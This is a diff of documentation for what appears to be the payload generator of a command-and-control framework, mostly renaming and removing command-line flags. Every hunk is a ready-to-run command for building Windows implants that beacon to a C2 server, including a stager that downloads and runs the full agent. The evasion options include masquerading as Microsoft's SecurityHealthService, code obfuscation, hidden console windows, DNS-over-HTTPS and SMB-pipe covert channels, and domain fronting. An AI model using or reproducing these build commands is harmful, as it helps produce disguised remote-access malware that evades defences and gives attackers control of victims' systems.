@@ -29,9 +29,8 @@ A complete agent binary. No external download phase. Larger but more reliable.
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server http://192.168.1.10:8080 \
+  --c2 http://192.168.1.10:8080 \
   --key changeme \
-  --os windows \
   --arch amd64 \
   --output ./output/agent.exe
 ```
@@ -53,7 +52,6 @@ A tiny binary that downloads and executes the full agent from the C2 stage endpo
 ./bin/taburtuai-generate stager \
   --server http://192.168.1.10:8080 \
   --key changeme \
-  --os windows \
   --arch amd64 \
   --output ./output/stager.exe
 ```
@@ -82,10 +80,9 @@ Profiles control runtime behavior baked at compile time.
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --profile stealth \
-  --os windows \
   --arch amd64 \
   --output ./output/agent_stealth.exe
 ```
@@ -106,15 +103,14 @@ Every Windows build can have its PE version resource spoofed to look like a legi
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
-  --os windows \
   --arch amd64 \
   --masq-company "Microsoft Corporation" \
   --masq-product "Microsoft Windows Operating System" \
   --masq-desc "Windows Security Health Service" \
   --masq-internal "SecurityHealthService" \
-  --masq-origfile "SecurityHealthService.exe" \
+  --masq-orig "SecurityHealthService.exe" \
   --masq-ver-major 10 \
   --masq-ver-minor 0 \
   --masq-ver-build 19041 \
@@ -134,7 +130,6 @@ Every Windows build can have its PE version resource spoofed to look like a legi
 
 | Flag | Effect | When to Use |
 |------|--------|-------------|
-| `--strip` | Remove debug symbols (`-s -w`) | Always in production |
 | `--compress` | UPX compression | When size matters; some AV flags UPX |
 | `--no-gui` | Hide console window (`-H windowsgui`) | Production Windows builds |
 | `--obfuscate` | Garble-based code obfuscation | Highest evasion (requires Garble installed) |
@@ -142,12 +137,10 @@ Every Windows build can have its PE version resource spoofed to look like a legi
 **Recommended production flags:**
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --profile opsec \
-  --os windows \
   --arch amd64 \
-  --strip \
   --no-gui \
   --output ./output/agent.exe
 ```
@@ -161,7 +154,7 @@ Build the agent to communicate over a covert channel instead of plain HTTP.
 ```bash
 # DNS-over-HTTPS (blends into normal HTTPS traffic to Cloudflare/Google)
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --transport doh \
   --doh-domain tunnels.c2.example.com \
@@ -170,7 +163,7 @@ Build the agent to communicate over a covert channel instead of plain HTTP.
 
 # SMB named pipe (works laterally, no external network needed)
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --transport smb \
   --smb-pipe \\.\pipe\svchost \
@@ -189,10 +182,9 @@ Route beacon traffic through a CDN (Cloudflare, Azure, AWS CloudFront) while the
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://real-c2.example.com \
+  --c2 https://real-c2.example.com \
   --key changeme \
   --front-domain legitimate-cdn.azurefd.net \
-  --os windows \
   --arch amd64 \
   --output ./output/agent.exe
 ```
@@ -213,7 +205,7 @@ openssl s_client -connect c2.example.com:443 </dev/null 2>/dev/null \
 
 # Build with cert pin
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --cert-pin "a1b2c3d4e5f6..." \
   --output ./output/agent_pinned.exe
